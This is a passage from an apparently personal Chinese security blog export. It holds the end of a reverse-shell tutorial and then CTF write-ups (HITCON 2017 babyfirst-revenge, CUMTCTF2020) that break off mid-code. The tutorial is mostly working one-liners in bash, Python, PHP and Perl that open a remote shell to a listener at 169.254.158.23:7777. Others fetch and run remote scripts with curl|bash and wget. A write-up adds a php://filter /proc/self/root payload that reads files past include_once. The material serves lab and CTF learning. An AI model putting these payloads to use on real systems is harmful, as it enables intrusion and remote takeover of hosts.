title=\"curl反弹\"></a>curl反弹</h2><p>前提要利用bash一句话的情况下使用curl反弹shell</p>\n<p>kali上index文件上含有bash一句话，就可以反弹shell。</p>\n<h3 id=\"实验-1\"><a href=\"#实验-1\" class=\"headerlink\" title=\"实验\"></a><strong>实验</strong></h3><p>kali（服务端）上检查是否有bash一句话</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl 192.168.202.129</span><br><span class=\"line\"></span><br><span class=\"line\">bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;169.254.158.23&#x2F;7777 0&gt;&amp;1</span><br></pre></td></tr></table></figure>\n<p>在win（客户端）上监听端口</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -nvlp 7777</span><br></pre></td></tr></table></figure>\n<p>利用服务端curl反弹</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl 192.168.202.129|bash</span><br></pre></td></tr></table></figure>\n<p>反弹成功</p>\n<p><img src=\"/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/image-20201002225540094.png\" alt=\"image-20201002225540094\"></p>\n<h2 id=\"wget反弹\"><a href=\"#wget反弹\" class=\"headerlink\" title=\"wget反弹\"></a>wget反弹</h2><p>其实是利用wget和php脚本一块执行达到反弹</p>\n<h3 id=\"实验-2\"><a href=\"#实验-2\" class=\"headerlink\" title=\"实验\"></a>实验</h3><p>首先在win（应该在任何一台服务器上也行）上有shell.txt，写入以下php内容</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$sock=fsockopen(<span class=\"string\">\"localhost\"</span>,<span class=\"number\">12345</span>);<span class=\"comment\">//localhost为自己的ip</span></span><br><span class=\"line\">exec(<span class=\"string\">\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\"</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>先在win（客户端）上监听</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -nvlp 7777</span><br></pre></td></tr></table></figure>\n<p>在kali（服务端）上利用wget下载shell.txt，然后执行php</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wget 169.254.158.23:8888&#x2F;shell.txt -O &#x2F;tmp&#x2F;x.php &amp;&amp; php &#x2F;tmp&#x2F;x.php</span><br></pre></td></tr></table></figure>\n<p>反弹成功</p>\n<p><img src=\"/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/image-20201002232826494.png\" alt=\"image-20201002232826494\"></p>\n<h2 id=\"python反弹\"><a href=\"#python反弹\" class=\"headerlink\" title=\"python反弹\"></a>python反弹</h2><p>利用curl</p>\n<p>但这次用的是py脚本</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">!/usr/bin/python</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">-*- coding: utf-8 -*-</span></span><br><span class=\"line\">import socket,subprocess,os</span><br><span class=\"line\">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class=\"line\">s.connect((\"169.254.158.23\",7777)) #更改localhost为自己的ip,端口任意</span><br><span class=\"line\">os.dup2(s.fileno(),0)</span><br><span class=\"line\">os.dup2(s.fileno(),1)</span><br><span class=\"line\">os.dup2(s.fileno(),2)</span><br><span class=\"line\">p=subprocess.call([\"/bin/sh\",\"-i\"])</span><br></pre></td></tr></table></figure>\n<p>当然也可以直接执行</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"169.254.158.23\",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);'</span><br></pre></td></tr></table></figure>\n<p>效果是一样的</p>\n<h3 id=\"实验1-1\"><a href=\"#实验1-1\" class=\"headerlink\" title=\"实验1\"></a>实验1</h3><p>首先在kali（服务端）上写下py脚本</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">!/usr/bin/python</span></span><br><span class=\"line\"><span class=\"meta\">#</span><span class=\"bash\">-*- coding: utf-8 -*-</span></span><br><span class=\"line\">import socket,subprocess,os</span><br><span class=\"line\">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class=\"line\">s.connect((\"169.254.158.23\",7777)) #更改localhost为自己的ip,端口任意</span><br><span class=\"line\">os.dup2(s.fileno(),0)</span><br><span class=\"line\">os.dup2(s.fileno(),1)</span><br><span class=\"line\">os.dup2(s.fileno(),2)</span><br><span class=\"line\">p=subprocess.call([\"/bin/sh\",\"-i\"])</span><br></pre></td></tr></table></figure>\n<p>win（客户端）监听</p>\n<figure class=\"highlight cmd\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -nvlp <span class=\"number\">7777</span></span><br></pre></td></tr></table></figure>\n<p>kali（服务端）curl</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl 192.168.202.129/shell.py|python</span><br></pre></td></tr></table></figure>\n<p>反弹成功</p>\n<p><img src=\"/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/image-20201003131626423.png\" alt=\"image-20201003131626423\"></p>\n<h3 id=\"实验2-1\"><a href=\"#实验2-1\" class=\"headerlink\" title=\"实验2\"></a>实验2</h3><p>在win（客户端）监听端口</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -nvlp 7777</span><br></pre></td></tr></table></figure>\n<p>在kali（服务端）输入</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;169.254.158.23&quot;,7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p&#x3D;subprocess.call([&quot;&#x2F;bin&#x2F;bash&quot;,&quot;-i&quot;]);&#39;</span><br></pre></td></tr></table></figure>\n<p>反弹成功</p>\n<p><img src=\"/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/image-20201003133539912.png\" alt=\"image-20201003133539912\"></p>\n<h2 id=\"php反弹\"><a href=\"#php反弹\" class=\"headerlink\" title=\"php反弹\"></a>php反弹</h2><p>和python一样利用curl</p>\n<p>php脚本如下，和上面的shell.txt一样的</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$sock=fsockopen(<span class=\"string\">\"169.254.158.23\"</span>,<span class=\"number\">7777</span>);<span class=\"comment\">//localhost为自己的ip，端口任意</span></span><br><span class=\"line\">exec(<span class=\"string\">\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\"</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>也可以执行</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php -r <span class=\"string\">'$sock=fsockopen(\"169.254.158.23\",7777);exec(\"/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");'</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"实验1-2\"><a href=\"#实验1-2\" class=\"headerlink\" title=\"实验1\"></a>实验1</h3><p>首先在kali（服务端）写下php脚本，存为shell.txt</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">$sock=fsockopen(<span class=\"string\">\"169.254.158.23\"</span>,<span class=\"number\">7777</span>);<span class=\"comment\">//localhost为自己的ip，端口任意</span></span><br><span class=\"line\">exec(<span class=\"string\">\"/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\"</span>);</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>在win（客户端）监听端口</p>\n<figure class=\"highlight cmd\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -nvlp <span class=\"number\">7777</span></span><br></pre></td></tr></table></figure>\n<p>kali（服务端）curl反弹</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">curl 192.168.202.129/shell.txt|php</span><br></pre></td></tr></table></figure>\n<p>反弹成功</p>\n<p><img src=\"/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/image-20201003132843970.png\" alt=\"image-20201003132843970\"></p>\n<h3 id=\"实验2-2\"><a href=\"#实验2-2\" class=\"headerlink\" title=\"实验2\"></a>实验2</h3><p>win上监听端口</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -nvlp 7777</span><br></pre></td></tr></table></figure>\n<p>kali上执行</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php -r <span class=\"string\">'$sock=fsockopen(\"169.254.158.23\",7777);exec(\"/bin/bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");'</span></span><br></pre></td></tr></table></figure>\n<p>反弹成功</p>\n<p><img src=\"/2020/10/03/%E5%8F%8D%E5%BC%B9shell%E6%80%BB%E7%BB%93/image-20201003133806050.png\" alt=\"image-20201003133806050\"></p>\n<h2 id=\"perl反弹\"><a href=\"#perl反弹\" class=\"headerlink\" title=\"perl反弹\"></a>perl反弹</h2><p>和上面几个反弹一样</p>\n<p>这里只做一下演示</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">perl -e 'use Socket;$i=\"169.254.158.23\";$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");&#125;;</span><br></pre></td></tr></table></figure>\n<h3 id=\"实验-3\"><a href=\"#实验-3\" class=\"headerlink\" title=\"实验\"></a>实验</h3><p>在win上监听端口</p>\n<p>在kali上执行</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">perl -e 'use Socket;$i=\"169.254.158.23\";$p=7777;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\"/bin/sh -i\");&#125;;</span><br></pre></td></tr></table></figure>\n<p>反弹成功</p>\n<h1 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h1><p>以上都是最基本的反弹shell</p>\n<p>其实反弹shell还是很灵活的，具体什么样的场景下怎么用还需要自己判断</p>\n","categories":["笔记"],"tags":["web"]},{"title":"复现wp","url":"https://pz1o.top/2020/09/28/复现wp/","content":"<a id=\"more\"></a>\n<h2 id=\"Hitcon2017-babyfirst-reveng\"><a href=\"#Hitcon2017-babyfirst-reveng\" class=\"headerlink\" title=\"Hitcon2017 babyfirst-reveng\"></a>Hitcon2017 babyfirst-reveng</h2><p>github复现地址</p>\n<p><a href=\"https://github.com/t3hp0rP/hitconDockerfile/tree/master/hitcon-ctf-2017/babyfirst-revenge\" target=\"_blank\" rel=\"noopener\">https://github.com/t3hp0rP/hitconDockerfile/tree/master/hitcon-ctf-2017/babyfirst-revenge</a></p>\n<h3 id=\"考点\"><a href=\"#考点\" class=\"headerlink\" title=\"考点\"></a>考点</h3><p>命令执行构造反弹shell</p>\n<p>源码如下：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    $sandbox = <span class=\"string\">'/www/sandbox/'</span> . md5(<span class=\"string\">\"orange\"</span> . $_SERVER[<span class=\"string\">'REMOTE_ADDR'</span>]);</span><br><span class=\"line\">    @mkdir($sandbox);</span><br><span class=\"line\">    @chdir($sandbox);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'cmd'</span>]) &amp;&amp; strlen($_GET[<span class=\"string\">'cmd'</span>]) &lt;= <span class=\"number\">5</span>) &#123;</span><br><span class=\"line\">        @exec($_GET[<span class=\"string\">'cmd'</span>]);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>($_GET[<span class=\"string\">'reset'</span>])) &#123;</span><br><span class=\"line\">        @exec(<span class=\"string\">'/bin/rm -rf '</span> . $sandbox);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br></pre></td></tr></table></figure>\n<p>先说几个知识点：</p>\n<blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt;e\\</span><br><span class=\"line\">&gt;cho\\</span><br><span class=\"line\">&#39;123&#39;</span><br><span class=\"line\">&gt;123</span><br></pre></td></tr></table></figure>\n<p>在linux中换行可以执行间断的命令</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\">root@kali:~<span class=\"comment\"># vi 1  //在1下写入cat flag.txt</span></span></span><br><span class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\">root@kali:~<span class=\"comment\"># touch flag.txt</span></span></span><br><span class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\">root@kali:~<span class=\"comment\"># echo \"cumtctf&#123;i_am_so_cute&#125;\" &gt;&gt; flag.txt</span></span></span><br><span class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\">root@kali:~<span class=\"comment\"># cat flag.txt</span></span></span><br><span class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\">cumtctf&#123;i_am_so_cute&#125;</span></span><br><span class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\">root@kali:~<span class=\"comment\"># sh 1</span></span></span><br><span class=\"line\"><span class=\"meta\">&gt;</span><span class=\"bash\">cumtctf&#123;i_am_so_cute&#125;</span></span><br></pre></td></tr></table></figure>\n<p>在Linux下面可以通过写入一个文件，文件里面的内容是系统命令，然后可以通过<code>sh filename</code>来执行文本里面的系统命令，如果有报错的话会自动跳过</p>\n</blockquote>\n<h1 id=\"CUMTCTF2020\"><a href=\"#CUMTCTF2020\" class=\"headerlink\" title=\"CUMTCTF2020\"></a>CUMTCTF2020</h1><h1 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h1><h2 id=\"简单的文件包含？\"><a href=\"#简单的文件包含？\" class=\"headerlink\" title=\"简单的文件包含？\"></a>简单的文件包含？</h2><h3 id=\"考点-1\"><a href=\"#考点-1\" class=\"headerlink\" title=\"考点\"></a>考点</h3><p>require_once绕过</p>\n<p>源码如下</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> ($_SERVER[<span class=\"string\">'HTTP_CLIENT_IP'</span>] != <span class=\"string\">'127.0.0.1'</span> &amp;&amp; $_SERVER[<span class=\"string\">'HTTP_X_REAL_IP'</span>] != <span class=\"string\">'127.0.0.1'</span>)&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> ($_SERVER[<span class=\"string\">'HTTP_X_FORWARDED_FOR'</span>] == <span class=\"string\">\"127.0.0.1\"</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">die</span>(<span class=\"string\">\"Do u think that I dont know X-Forwarded-For?&lt;br&gt;Too young too simple sometimes naive\"</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">die</span>(<span class=\"string\">\"Sorry, this site is only optimized for those who comes from localhost\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">show_source(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"keyword\">include_once</span>(<span class=\"string\">\"flag.php\"</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($_POST[<span class=\"string\">'f'</span>])) </span><br><span class=\"line\">  <span class=\"keyword\">include_once</span>($_POST[<span class=\"string\">'f'</span>]);</span><br></pre></td></tr></table></figure>\n<p>这里主要问题是<code>reuqire_once</code>的问题</p>\n<p><a href=\"https://www.anquanke.com/post/id/213235#h3-2\" target=\"_blank\" rel=\"noopener\">https://www.anquanke.com/post/id/213235#h3-2</a></p>\n<p>这里面的源码解析有得还是看不懂，日后再翻</p>\n<p>首先说一下php文件包含的机制是将<strong>已经包含的文件与文件的真实路径放进哈希表中</strong>，当已经<code>require_once(&#39;flag.php&#39;)</code>，已经include的文件不可以再<code>require_once</code>。</p>\n<p>payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>/proc/self指向当前进程的/proc/pid/</p>\n<p>/proc/self/root/指向/的符号</p>\n<p><img src=\"/2020/09/28/%E5%A4%8D%E7%8E%B0wp/image-20200928111221260.png\" alt></p>\n</blockquote>\n<h2 id=\"👍🙌😃\"><a href=\"#👍🙌😃\" class=\"headerlink\" title=\"👍🙌😃\"></a>👍🙌😃</h2><h3 id=\"考点-2\"><a href=\"#考点-2\" class=\"headerlink\" title=\"考点\"></a>考点</h3><p>代码格式化、反混淆，bcrypt爆破，<strong>命令执行</strong></p>\n<p>这个题 我只能说真的牛逼</p>\n<p>真的开眼界 还可以这样</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">require</span> <span class=\"string\">'vendor/autoload.php'</span>;</span><br><span class=\"line\"><span class=\"keyword\">use</span> <span class=\"title\">Bcrypt</span>\\<span class=\"title\">Bcrypt</span>;</span><br><span class=\"line\">highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\">ini_set(<span class=\"string\">\"display_errors\"</span>,<span class=\"string\">\"Off\"</span>);</span><br><span class=\"line\">$🙐=<span class=\"keyword\">array</span>(<span class=\"string\">'🙐'</span>,<span class=\"string\">'🙑'</span>,<span class=\"string\">'🙒'</span>,<span class=\"string\">'🙓'</span>,<span class=\"string\">'🙔'</span>,<span class=\"string\">'🙕'</span>,<span class=\"string\">'🙖'</span>,<span class=\"string\">'🙗'</span>,<span class=\"string\">'🙘'</span>,<span class=\"string\">'🙙'</span>,<span class=\"string\">'🙚'</span>,<span class=\"string\">'🙛'</span>,<span class=\"string\">'🙜'</span>,<span class=\"string\">'🙝'</span>,<span class=\"string\">'🙞'</span>,<span class=\"string\">'🙟'</span>);</span><br><span class=\"line\">$🙠=<span class=\"keyword\">array</span>(<span class=\"string\">'🙠'</span>,<span class=\"string\">'🙡'</span>,<span class=\"string\">'🙢'</span>,<span class=\"string\">'🙣'</span>,<span class=\"string\">'🙤'</span>,<span class=\"string\">'🙥'</span>,<span class=\"string\">'🙦'</span>,<span class=\"string\">'🙧'</span>,<span class=\"string\">'🙨'</span>,<span class=\"string\">'🙩'</span>,<span class=\"string\">'🙪'</span>,<span class=\"string\">'🙫'</span>,<span class=\"string\">'🙬'</span>,<span class=\"string\">'🙭'</span>,<span class=\"string\">'🙮'</span>,<span class=\"string\">'🙯'</span>);</span><br><span class=\"line\">$🙰=<span class=\"keyword\">array</span>(<span class=\"string\">'🙰'</span>,<span class=\"string\">'🙱'</span>,<span class=\"string\">'🙲'</span>,<span class=\"string\">'🙳'</span>,<span class=\"string\">'🙴'</span>,<span class=\"string\">'🙵'</span>,<span class=\"string\">'🙶'</span>,<span class=\"string\">'🙷'</span>,<span class=\"string\">'🙸'</span>,<span class=\"string\">'🙹'</span>,<span class=\"string\">'🙺'</span>,<span class=\"string\">'🙻'</span>,<span class=\"string\">'🙼'</span>,<span class=\"string\">'🙽'</span>,<span class=\"string\">'🙾'</span>,<span class=\"string\">'🙿'</span>);</span><br><span class=\"line\">$😀=<span class=\"keyword\">array</span>(<span class=\"string\">'😀'</span>,<span class=\"string\">'😁'</span>,<span class=\"string\">'😂'</span>,<span class=\"string\">'😃'</span>,<span class=\"string\">'😄'</span>,<span class=\"string\">'😅'</span>,<span class=\"string\">'😆'</span>,<span class=\"string\">'😇'</span>,<span class=\"string\">'😈'</span>,<span class=\"string\">'😉'</span>,<span class=\"string\">'😊'</span>,<span class=\"string\">'😋'</span>,<span class=\"string\">'😌'</span>,<span class=\"string\">'😍'</span>,<span class=\"string\">'😎'</span>,<span class=\"string\">'😏'</span>);</span><br><span class=\"line\">$😐=<span class=\"keyword\">array</span>(<span class=\"string\">'😐'</span>,<span class=\"string\">'😑'</span>,<span class=\"string\">'😒'</span>,<span class=\"string\">'😓'</span>,<span class=\"string\">'😔'</span>,<span class=\"string\">'😕'</span>,<span class=\"string\">'😖'</span>,<span class=\"string\">'😗'</span>,<span class=\"string\">'😘'</span>,<span class=\"string\">'😙'</span>,<span class=\"string\">'😚'</span>,<span class=\"string\">'😛'</span>,<span class=\"string\">'😜'</span>,<span class=\"string\">'😝'</span>,<span class=\"string\">'😞'</span>,<span class=\"string\">'😟'</span>);</span><br><span class=\"line\">$😠=<span class=\"keyword\">array</span>(<span class=\"string\">'😠'</span>,<span class=\"string\">'😡'</span>,<span class=\"string\">'😢'</span>,<span class=\"string\">'😣'</span>,<span class=\"string\">'😤'</span>,<span class=\"string\">'😥'</span>,<span class=\"string\">'😦'</span>,<span class=\"string\">'😧'</span>,<span class=\"string\">'😨'</span>,<span class=\"string\">'😩'</span>,<span class=\"string\">'😪'</span>,<span class=\"string\">'😫'</span>,<span class=\"string\">'😬'</span>,<span class=\"string\">'😭'</span>,<span class=\"string\">'😮'</span>,<span class=\"string\">'😯'</span>);</span><br><span class=\"line\">$😰=<span class=\"keyword\">array</span>(<span class=\"string\">'😰'</span>,<span class=\"string\">'😱'</span>,<span class=\"string\">'😲'</span>,<span class=\"string\">'😳'</span>,<span class=\"string\">'😴'</span>,<span class=\"string\">'😵'</span>,<span class=\"string\">'😶'</span>,<span class=\"string\">'😷'</span>,<span class=\"string\">'😸'</span>,<span class=\"string\">'😹'</span>,<span class=\"string\">'😺'</span>,<span class=\"string\">'😻'</span>,<span class=\"string\">'😼'</span>,<span class=\"string\">'😽'</span>,<span class=\"string\">'😾'</span>,<span class=\"string\">'😿'</span>);</span><br><span class=\"line\">$🙀=<span class=\"keyword\">array</span>(<span class=\"string\">'🙀'</span>,<span class=\"string\">'🙁'</span>,<span class=\"string\">'🙂'</span>,<span class=\"string\">'🙃'</span>,<span class=\"string\">'🙄'</span>,<span class=\"string\">'🙅'</span>,<span class=\"string\">'🙆'</span>,<span class=\"string\">'🙇'</span>,<span class=\"string\">'🙈'</span>,<span class=\"string\">'🙉'</span>,<span class=\"string\">'🙊'</span>,<span class=\"string\">'🙋'</span>,<span class=\"string\">'🙌'</span>,<span class=\"string\">'🙍'</span>,<span 